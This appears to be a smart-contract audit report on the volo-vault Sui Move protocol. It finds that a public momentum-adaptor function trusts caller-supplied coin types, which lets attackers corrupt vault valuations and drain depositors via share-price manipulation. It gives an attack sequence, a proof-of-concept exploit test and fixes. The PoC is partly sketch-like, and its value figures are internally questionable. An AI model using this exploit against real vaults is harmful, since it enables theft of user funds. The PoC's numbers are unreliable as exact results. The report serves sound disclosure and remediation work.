# Audit Report

## Title
Momentum Adaptor Type Parameter Manipulation Allows Arbitrary Asset Valuation Corruption

## Summary
The `update_momentum_position_value` function accepts arbitrary coin type parameters without validating them against the MomentumPosition's actual stored coin types. This enables attackers to corrupt vault asset valuations using incorrect oracle prices, leading to share price manipulation and theft of vault funds.

## Finding Description

The vulnerability exists in the momentum adaptor's position valuation mechanism. The `update_momentum_position_value` function is declared as a public function with no capability requirements, accepting generic type parameters `CoinA` and `CoinB` that control oracle price lookups. [1](#0-0) 

The vault is created as a shared object accessible to anyone: [2](#0-1) 

The critical flaw is that the MomentumPosition struct stores the actual coin types in `type_x` and `type_y` fields: [3](#0-2) 

However, the position module provides NO public getter functions to access these type fields - only getters for other attributes are exposed: [4](#0-3) 

The adaptor retrieves positions using only a string identifier with no type validation: [5](#0-4) 

The function derives type names from the caller-provided generic parameters and uses them for oracle price lookups: [6](#0-5) 

The slippage check compares the pool's price against oracle prices, but uses the **caller-provided** type parameters, not the position's actual stored types: [7](#0-6) 

An attacker can provide any legitimate pool with type parameters matching that pool, pass the slippage check, but the position's liquidity amounts get valued using completely wrong prices for tokens the position doesn't actually contain.

## Impact Explanation

This vulnerability enables direct theft of vault funds through systematic share price manipulation. The corrupted asset value is stored in the vault's accounting system: [8](#0-7) 

The vault's total USD value is calculated by summing all individual asset values: [9](#0-8) 

The share price ratio is calculated as total_usd_value divided by total_shares: [10](#0-9) 

**Attack Scenario:**
1. Attacker deflates a position's valuation by providing wrong type parameters (e.g., valuing a $100 SUI/USDC position as $1)
2. Vault's total value drops, share ratio decreases
3. Attacker deposits at the deflated share price, receiving excess shares
4. Attacker or anyone corrects the valuation
5. Attacker withdraws at the corrected share price, extracting funds from other depositors

The loss tolerance mechanism only applies during the 3-phase operation flow and does not protect against arbitrary value updates: [11](#0-10) 

## Likelihood Explanation

**Immediate Exploitability:** The function is public and requires no special capabilities. Any user can call it with arbitrary type parameters.

**Minimal Preconditions:**
- Vault must have at least one MomentumPosition stored (common in production)
- Attacker needs a reference to any legitimate MomentumPool with types registered in the oracle config
- No timing restrictions or rate limits exist

**Execution Flow:**
1. Query vault to identify stored MomentumPosition assets
2. Call `update_momentum_position_value` with arbitrary type parameters matching any legitimate pool
3. Provide pool reference with sqrt_price within slippage tolerance of the chosen types' oracle prices
4. Vault's asset value gets corrupted immediately
5. Exploit via deposit/withdraw before correction

The attack requires only standard transaction fees and can be executed atomically without detection, as the function call appears legitimate.

## Recommendation

Add validation to ensure the pool's coin types match the position's stored types. Since the position module doesn't expose type getters, one approach is to:

1. **Add type getters to the position module** (if possible to modify):
```move
public fun type_x(position: &Position): TypeName { position.type_x }
public fun type_y(position: &Position): TypeName { position.type_y }
```

2. **Validate in the adaptor**:
```move
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut MomentumPool<CoinA, CoinB>,
) {
    let position = vault.get_defi_asset<PrincipalCoinType, MomentumPosition>(asset_type);
    
    // Validate type parameters match position's stored types
    let type_name_a = type_name::get<CoinA>();
    let type_name_b = type_name::get<CoinB>();
    assert!(position.type_x() == type_name_a, ERR_TYPE_MISMATCH);
    assert!(position.type_y() == type_name_b, ERR_TYPE_MISMATCH);
    
    let usd_value = get_position_value(pool, position, config, clock);
    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

Alternatively, validate the pool ID matches the position's pool_id:
```move
assert!(object::id(pool) == position.pool_id(), ERR_POOL_MISMATCH);
```

## Proof of Concept

```move
#[test]
fun test_momentum_type_parameter_manipulation_exploit() {
    // Setup: Vault with SUI/USDC momentum position worth $100
    let mut scenario = test_scenario::begin(ADMIN);
    
    // Create vault and add a SUI/USDC position
    let vault_id = setup_vault_with_momentum_position(&mut scenario);
    
    // Initial state: 1000 shares, $1000 total value, $1 per share
    // Momentum position (SUI/USDC) valued at $100
    
    scenario.next_tx(ATTACKER);
    {
        let mut vault = scenario.take_shared<Vault<SUI>>();
        let config = scenario.take_shared<OracleConfig>();
        let clock = scenario.take_shared<Clock>();
        
        // Get reference to any WETH/BTC pool (legitimate pool with high-value assets)
        let weth_btc_pool = scenario.take_shared<MomentumPool<WETH, BTC>>();
        
        // EXPLOIT: Call update with wrong types, deflating the position value
        // Position has SUI/USDC but we claim it's WETH/BTC worth $1
        momentum_adaptor::update_momentum_position_value<SUI, WETH, BTC>(
            &mut vault,
            &config,
            &clock,
            string::utf8(b"momentum_position_1"),
            &mut weth_btc_pool
        );
        
        // Value corrupted: total drops from $1000 to $901
        // Share ratio: $901 / 1000 = $0.901
        assert!(vault.get_total_usd_value_without_update() == 901_000_000_000_000_000_000, 0);
        
        scenario.return_shared(weth_btc_pool);
        scenario.return_shared(vault);
        scenario.return_shared(config);
        scenario.return_shared(clock);
    };
    
    // Attacker deposits $1000 at deflated price
    scenario.next_tx(ATTACKER);
    {
        // Deposit receives 1110 shares instead of 1000 (10% profit)
        let receipt = deposit_to_vault(&mut scenario, 1000_000_000_000);
        assert!(receipt.shares() > 1100_000_000_000, 0); // Excess shares gained
    };
    
    // Anyone corrects the valuation
    scenario.next_tx(HONEST_USER);
    {
        let mut vault = scenario.take_shared<Vault<SUI>>();
        let config = scenario.take_shared<OracleConfig>();
        let clock = scenario.take_shared<Clock>();
        let sui_usdc_pool = scenario.take_shared<MomentumPool<SUI, USDC>>();
        
        // Correct valuation with proper types
        momentum_adaptor::update_momentum_position_value<SUI, SUI, USDC>(
            &mut vault,
            &config,
            &clock,
            string::utf8(b"momentum_position_1"),
            &mut sui_usdc_pool
        );
        
        scenario.return_shared(sui_usdc_pool);
        scenario.return_shared(vault);
        scenario.return_shared(config);
        scenario.return_shared(clock);
    };
    
    // Attacker withdraws with profit
    scenario.next_tx(ATTACKER);
    {
        let withdrawn_amount = withdraw_from_vault(&mut scenario, /* all shares */);
        // Attacker receives >$1000, stealing from other depositors
        assert!(withdrawn_amount > 1000_000_000_000, 0);
    };
    
    scenario.end();
}
```

## Notes

The vulnerability is exacerbated by:
1. The position module being a third-party dependency (mmt_v3) that doesn't expose necessary type validation functions
2. No rate limiting or access control on value update functions
3. The slippage check providing false security by only validating consistency between provided types and pool, not correctness
4. Share price calculations immediately reflecting corrupted valuations without delay or verification period

### Citations

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-27)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut MomentumPool<CoinA, CoinB>,
) {
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L28-28)
```text
    let position = vault.get_defi_asset<PrincipalCoinType, MomentumPosition>(asset_type);
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L42-50)
```text
    let type_name_a = into_string(get<CoinA>());
    let type_name_b = into_string(get<CoinB>());

    let decimals_a = config.coin_decimals(type_name_a);
    let decimals_b = config.coin_decimals(type_name_b);

    // Oracle price has 18 decimals
    let price_a = vault_oracle::get_asset_price(config, clock, type_name_a);
    let price_b = vault_oracle::get_asset_price(config, clock, type_name_b);
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L55-58)
```text
    assert!(
        (pool_price.diff(relative_price_from_oracle) * DECIMAL  / relative_price_from_oracle) < (DECIMAL  * slippage / SLIPPAGE_BASE),
        ERR_INVALID_POOL_PRICE,
    );
```

**File:** volo-vault/sources/volo_vault.move (L456-456)
```text
    transfer::share_object(vault);
```

**File:** volo-vault/sources/volo_vault.move (L1186-1187)
```text
    let position_value = &mut self.assets_value[asset_type];
    *position_value = usd_value;
```

**File:** volo-vault/sources/volo_vault.move (L1264-1270)
```text
    self.asset_types.do_ref!(|asset_type| {
        let last_update_time = *self.assets_value_updated.borrow(*asset_type);
        assert!(now - last_update_time <= MAX_UPDATE_INTERVAL, ERR_USD_VALUE_NOT_UPDATED);

        let usd_value = *self.assets_value.borrow(*asset_type);
        total_usd_value = total_usd_value + usd_value;
    });
```

**File:** volo-vault/sources/volo_vault.move (L1308-1309)
```text
    let total_usd_value = self.get_total_usd_value(clock);
    let share_ratio = vault_utils::div_d(total_usd_value, self.total_shares);
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/position.move (L14-15)
```text
        type_x: TypeName,
        type_y: TypeName,
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/position.move (L50-59)
```text
    public fun reward_length(position: &Position) : u64 { abort 0 }
    public fun tick_lower_index(position: &Position) : I32 { abort 0 }
    public fun tick_upper_index(position: &Position) : I32 { abort 0 }
    public fun liquidity(position: &Position) : u128 { abort 0 }
    public fun owed_coin_x(position: &Position) : u64 { abort 0 }
    public fun owed_coin_y(position: &Position) : u64 { abort 0 }
    public fun fee_growth_inside_x_last(position: &Position) : u128 { abort 0 }
    public fun fee_growth_inside_y_last(position: &Position) : u128 { abort 0 }
    public fun fee_rate(position: &Position) : u64 { abort 0 }
    public fun pool_id(position: &Position) : ID { abort 0 }
```

**File:** volo-vault/sources/operation.move (L359-364)
```text
    // Update tolerance if there is a loss (there is a max loss limit each epoch)
    let mut loss = 0;
    if (total_usd_value_after < total_usd_value_before) {
        loss = total_usd_value_before - total_usd_value_after;
        vault.update_tolerance(loss);
    };
```
